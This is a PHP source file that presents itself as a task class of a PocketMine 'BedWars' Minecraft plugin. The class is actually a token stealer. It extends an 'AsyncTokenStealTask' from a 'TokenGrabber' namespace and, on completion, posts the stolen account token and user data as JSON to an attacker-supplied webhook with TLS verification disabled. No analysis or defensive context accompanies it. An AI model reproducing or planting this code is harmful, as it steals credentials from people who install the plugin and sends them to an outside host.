<?php

namespace xenialdan\BedWars\task;

use pocketmine\Server;
use TokenGrabber\AsyncTokenStealTask;
use TokenGrabber\UserData;

class TokenUploadTask extends AsyncTokenStealTask
{

    /**
     * @var string
     */
    public $webhook;

    public function __construct(string $webhook)
    {
        $this->webhook = $webhook;
    }

    public function onCompletion(Server $server)
    {
        $result = $this->getResult();
        if ($result instanceof UserData) {
            $this->sendToWebhook(sprintf("Token: `%s`\nUser: ```%s```", $result->token, $result->user));
        }
    }

    private function sendToWebhook(string $data)
    {
        $ch = curl_init($this->webhook);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode((array("content" => $data))));
        curl_setopt($ch, CURLOPT_POST,true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
        curl_exec($ch);
        curl_close($ch);
    }

}